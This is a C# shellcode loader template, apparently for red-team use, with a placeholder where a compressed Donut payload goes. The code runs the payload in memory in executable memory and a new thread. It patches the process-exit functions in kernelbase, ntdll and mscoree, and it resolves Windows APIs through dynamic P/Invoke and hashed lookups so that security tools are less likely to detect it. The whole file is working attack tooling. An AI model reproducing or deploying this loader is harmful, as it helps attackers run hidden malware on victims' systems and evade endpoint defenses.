using System;
using System.IO;
using System.Linq;
using System.IO.Compression;
using System.Reflection;
using System.Reflection.Emit;
using System.ComponentModel;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace NAMESPACE
{
    public class Program
    {
        static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream dStream = new DeflateStream(input, CompressionMode.Decompress))
                dStream.CopyTo(output);

            return output.ToArray();
        }

        public static void Main()
        {
            var compressed = Convert.FromBase64String("DONUT");
            var rawBytes = Decompress(compressed);

            IntPtr pointer = Marshal.AllocHGlobal(rawBytes.Length);
            Marshal.Copy(rawBytes, 0, pointer, rawBytes.Length);

            _ = DPInvoke.VirtualProtect(pointer, (UIntPtr)rawBytes.Length, (uint)0x40, out _);

            _ = ExitPatcher.PatchExit();

            IntPtr hThread = DPInvoke.CreateThread(IntPtr.Zero, 0, pointer, IntPtr.Zero, 0, IntPtr.Zero);
            _ = DPInvoke.WaitForSingleObject(hThread, 0xFFFFFFFF);

            Marshal.FreeHGlobal(pointer);

            ExitPatcher.ResetExitFunctions();
        }
    }

    /// <summary>
    /// Based on: https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/
    /// </summary>
    class DPInvoke
    {
        static object DynamicPInvokeBuilder(Type type, string library, string method, object[] parameters, Type[] parameterTypes)
        {
            AssemblyName assemblyName = new AssemblyName("Temp01");
            AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule("Temp02");

            MethodBuilder methodBuilder = moduleBuilder.DefinePInvokeMethod(method, library, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, CallingConventions.Standard, type, parameterTypes, CallingConvention.Winapi, CharSet.Ansi);

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();

            MethodInfo dynamicMethod = moduleBuilder.GetMethod(method);
            object result = dynamicMethod.Invoke(null, parameters);

            return result;
        }

        public static IntPtr GetModuleHandle(string lpModuleName)
        {
            Type[] parameterTypes = { typeof(string) };
            object[] parameters = { lpModuleName };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), "kernel32.dll", "GetModuleHandle", parameters, parameterTypes);
            return result;
        }

        public static IntPtr GetProcAddress(IntPtr hModule, string procName)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(string) };
            object[] parameters = { hModule, procName };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), "kernel32.dll", "GetProcAddress", parameters, parameterTypes);
            return result;
        }

        public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            uint oldProtect = 0;

            Type[] parameterTypes = { typeof(IntPtr), typeof(UIntPtr), typeof(uint), typeof(uint).MakeByRefType() };
            object[] parameters = { lpAddress, dwSize, flNewProtect, oldProtect };
            var result = (bool)DynamicPInvokeBuilder(typeof(bool), "kernel32.dll", "VirtualProtect", parameters, parameterTypes);

            if (!result) throw new Win32Exception(Marshal.GetLastWin32Error());
            lpflOldProtect = (uint)parameters[3];

            return result;
        }

        public static IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
            object[] parameters = { lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), "kernel32.dll", "CreateThread", parameters, parameterTypes);
            return result;
        }

        public static uint WaitForSingleObject(IntPtr Handle, uint Wait)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(uint) };
            object[] parameters = { Handle, Wait };
            var result = (uint)DynamicPInvokeBuilder(typeof(uint), "kernel32.dll", "WaitForSingleObject", parameters, parameterTypes);
            return result;
        }
    }

    /// <summary>
    /// Based on: https://dr4k0nia.github.io/dotnet/coding/2022/08/10/HInvoke-and-avoiding-PInvoke.html
    /// </summary>
    public class HInvoke
    {
#pragma warning disable CS8632 // The annotation for nullable reference types should only be used in code within a '#nullable' annotations context.
        static void InvokeMethod(uint classHash, uint methodHash, object[] args = null)
#pragma warning restore CS8632 // The annotation for nullable reference types should only be used in code within a '#nullable' annotations context.
        {
            var typeDef = typeof(void).Assembly.GetTypes()
                .FirstOrDefault(type => GetHash(type.FullName) == classHash);

            var methodInfo = typeDef.GetRuntimeMethods()
                .FirstOrDefault(method => GetHash(method.Name) == methodHash);

            if (methodInfo != null)
                methodInfo.Invoke(null, args);
        }

#pragma warning disable CS8632 // The annotation for nullable reference types should only be used in code within a '#nullable' annotations context.
        static T InvokeMethod<T>(uint classHash, uint methodHash, object[] args = null)
#pragma warning restore CS8632 // The annotation for nullable reference types should only be used in code within a '#nullable' annotations context.
        {
            var typeDef = typeof(void).Assembly.GetTypes()
                .FirstOrDefault(type => GetHash(type.FullName) == classHash);

            var runtimeMethod = typeDef.GetRuntimeMethods()
                .FirstOrDefault(method => GetHash(method.Name) == methodHash);

            if (runtimeMethod != null)
                return (T)runtimeMethod.Invoke(null, args);

            return default(T);
        }

        static T GetPropertyValue<T>(uint classHash, uint propertyHash)
        {
            var typeDef = typeof(void).Assembly.GetTypes()
                .FirstOrDefault(type => GetHash(type.FullName) == classHash);

            var runtimeProperty = typeDef.GetRuntimeProperties()
                .FirstOrDefault(property => GetHash(property.Name) == propertyHash);

            if (runtimeProperty != null)
                return (T)runtimeProperty.GetValue(null);

            return default(T);
        }

        static uint GetHash(string str)
        {
            uint sum = 0;
            foreach (char c in str)
                sum = (sum >> 0xA | sum << 0x11) + c;
            sum = (sum >> 0xA | sum << 0x11) + 0;

            return sum;
        }

        public static IntPtr GetModuleHandle(string lpModuleName)
        {
            object[] parameters = { lpModuleName };
            var result = InvokeMethod<IntPtr>(13239936, 811580934, parameters); // Microsoft.Win32.Win32Native, GetModuleHandle
            return result;
        }

        public static IntPtr GetProcAddress(IntPtr hModule, string procName)
        {
            object[] parameters = { hModule, procName };
            var result = InvokeMethod<IntPtr>(13239936, 1721745356, parameters); // Microsoft.Win32.Win32Native, GetProcAddress
            return result;
        }

        public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            var moduleHandle = GetModuleHandle("kernel32.dll");
            var functionPointer = GetProcAddress(moduleHandle, "VirtualProtect");

            Delegates.VirtualProtect virtualProtect = (Delegates.VirtualProtect)Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(Delegates.VirtualProtect));

            var result = virtualProtect(lpAddress, dwSize, flNewProtect, out uint oldProtect);
            lpflOldProtect = oldProtect;

            return result;
        }

        public static IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
        {
            var moduleHandle = GetModuleHandle("kernel32.dll");
            var functionPointer = GetProcAddress(moduleHandle, "CreateThread");

            Delegates.CreateThread createThread = (Delegates.CreateThread)Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(Delegates.CreateThread));

            var result = createThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

            return result;
        }

        public static uint WaitForSingleObject(IntPtr Handle, uint Wait)
        {
            var moduleHandle = GetModuleHandle("kernel32.dll");
            var functionPointer = GetProcAddress(moduleHandle, "WaitForSingleObject");

            Delegates.WaitForSingleObject waitForSingleObject = (Delegates.WaitForSingleObject)Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(Delegates.WaitForSingleObject));

            var result = waitForSingleObject(Handle, Wait);

            return result;
        }
    }

    /// <summary>
    /// Stolen from:
    /// https://github.com/nettitude/RunPE/blob/main/RunPE/Patchers/ExitPatcher.cs
    /// https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/NanoDumpInject.cs
    /// </summary>
    class ExitPatcher
    {
        internal const uint PAGE_EXECUTE_READWRITE = 0x40;

        static private byte[] _terminateProcessOriginalBytes;
        static private byte[] _ntTerminateProcessOriginalBytes;
        static private byte[] _rtlExitUserProcessOriginalBytes;
        static private byte[] _corExitProcessOriginalBytes;

        static byte[] PatchFunction(string dllName, string functionName, byte[] patchBytes)
        {
            var moduleHandle = HInvoke.GetModuleHandle(dllName);
            var functionPointer = HInvoke.GetProcAddress(moduleHandle, functionName);

            var originalBytes = new byte[patchBytes.Length];
            Marshal.Copy(functionPointer, originalBytes, 0, patchBytes.Length);

            if (!DPInvoke.VirtualProtect(functionPointer, (UIntPtr)patchBytes.Length, PAGE_EXECUTE_READWRITE, out var oldProtect))
                return null;

            Marshal.Copy(patchBytes, 0, functionPointer, patchBytes.Length);

            if (!DPInvoke.VirtualProtect(functionPointer, (UIntPtr)patchBytes.Length, oldProtect, out _))
                return null;

            return originalBytes;
        }

        public static bool PatchExit()
        {
            var hKernelbase = HInvoke.GetModuleHandle("kernelbase");
            var pExitThreadFunc = HInvoke.GetProcAddress(hKernelbase, "ExitThread");

            /*
             * mov rcx, 0x0
             * mov rax, <ExitThread>
             * push rax
             * ret
            */
            var exitThreadPatchBytes = new List<byte>() { 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8 };
            var pointerBytes = BitConverter.GetBytes(pExitThreadFunc.ToInt64());

            exitThreadPatchBytes.AddRange(pointerBytes);

            exitThreadPatchBytes.Add(0x50);
            exitThreadPatchBytes.Add(0xC3);

            _terminateProcessOriginalBytes = PatchFunction("kernelbase", "TerminateProcess", exitThreadPatchBytes.ToArray());
            if (_terminateProcessOriginalBytes == null)
                return false;

            _corExitProcessOriginalBytes = PatchFunction("mscoree", "CorExitProcess", exitThreadPatchBytes.ToArray());
            if (_corExitProcessOriginalBytes == null)
                return false;

            _ntTerminateProcessOriginalBytes = PatchFunction("ntdll", "NtTerminateProcess", exitThreadPatchBytes.ToArray());
            if (_ntTerminateProcessOriginalBytes == null)
                return false;

            _rtlExitUserProcessOriginalBytes = PatchFunction("ntdll", "RtlExitUserProcess", exitThreadPatchBytes.ToArray());
            if (_rtlExitUserProcessOriginalBytes == null)
                return false;

            return true;
        }

        public static void ResetExitFunctions()
        {
            PatchFunction("kernelbase", "TerminateProcess", _terminateProcessOriginalBytes);
            PatchFunction("mscoree", "CorExitProcess", _corExitProcessOriginalBytes);
            PatchFunction("ntdll", "NtTerminateProcess", _ntTerminateProcessOriginalBytes);
            PatchFunction("ntdll", "RtlExitUserProcess", _rtlExitUserProcessOriginalBytes);
        }
    }

    class Delegates
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool VirtualProtect(
            IntPtr lpAddress,
            UIntPtr dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint WaitForSingleObject(
            IntPtr Handle,
            uint Wait);
    }
}
